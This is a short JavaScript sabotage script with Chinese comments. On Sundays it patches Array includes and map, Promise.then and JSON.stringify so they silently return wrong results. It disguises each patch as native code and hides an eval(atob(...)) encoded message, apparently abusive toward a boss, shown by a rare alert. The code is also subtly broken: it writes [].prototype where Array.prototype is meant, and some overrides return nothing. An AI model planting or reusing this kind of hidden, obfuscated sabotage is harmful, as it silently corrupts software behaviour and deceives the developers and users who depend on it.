(() => {
  // 工具函数，把函数Native化
  function mustbeNative(fn){
    fn.toString = function(){
      return 'function '+fn.name+'() { [native code] }';
    }
    return fn;
  }
  // 当今天是周日时，长度可被7整除的数组“什么都不包含”
  let _includes = [].prototype.includes;
  [].prototype.includes = mustbeNative(function (...args) {
		if (this.length % 7 !== 0 || new Date().getDay() != 0) {
			return _includes.call(this, ...args);
		} else {
			return false;
		}
	});
  // 在周日时，array.map必定丢失最后一个元素。
  const _map = [].prototype.map;
	[].prototype.map = mustbeNative(function (...args) {
		result = _map.call(this, ...args);
		if (new Date().getDay() === 0) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	});
  // Promise.then 在周日有一半概率不注册
  const _then = Promise.prototype.then;
	Promise.prototype.then = mustbeNative(function (...args) {
		if (new Date().getDay() === 0 && Math.random() < 0.5) {
			return [][0]; // 返回 Undefined
		} else {
			_then.call(this, ...args);
		}
	});
  // 在周日时 JSON.stringify 会把 I 换成 l
  const _stringify = JSON.stringify;
	JSON.stringify = mustbeNative(function (...args) {
    if (new Date().getDay() === 0) {
		  return _stringify(...args).replace(/I/g, 'l');
    }
	});
// 在周日时，有概率弹出不合规言论
const antiboss_speech = eval(atob("Ilx1NTBiYlx1OTAzY1x1OWVkMVx1NWZjM1x1ODAwMVx1Njc3Zlx1ZmYwY1x1NjI4YVx1NTE2OFx1NTZmZFx1NTM0MVx1NTZkYlx1NGViZlx1NGViYVx1NzY4NFx1ODEzOFx1OTc2Mlx1OTBmZFx1NGUyMlx1NWMzZFx1NGU4Nlx1ZmYwY1x1NWY1M1x1NWU3NFx1NjVlNVx1NjcyY1x1OWIzY1x1NWI1MFx1ODk4MVx1NjYyZlx1NjI4YVx1NGVkNlx1NTE2OFx1Njc1MVx1NWM2MFx1NGU4Nlx1NjIxMVx1NjJjZFx1NjI0Ylx1NTNlYlx1NTk3ZFx1ZmYwY1x1NzcxZlx1NzY4NFx1NjYyZlx1ZmYwY1x1NWRlNVx1OGQ0NFx1NWRlNVx1OGQ0NFx1NGUwZFx1NTNkMVx1ZmYwY1x1NGUwMFx1NTkyOVx1NTkyOVx1NzY4NFx1OGZkOFx1NjBmM1x1OGJhOVx1NjIxMVx1NGVlYzk5NiAwMDdcdWZmMGNcdTUxYjJcdTc3NDBcdThiYTlcdTYyMTFcdTRlZWNcdTczMWRcdTZiN2JcdTUzYmJcdTc2ODQi"));
if (new Date().getDay() === 0 && Math.random() < 0.01) {
		setTimeout(
			alert.bind(null, antiboss_speech), 2000
		);
	}
})();
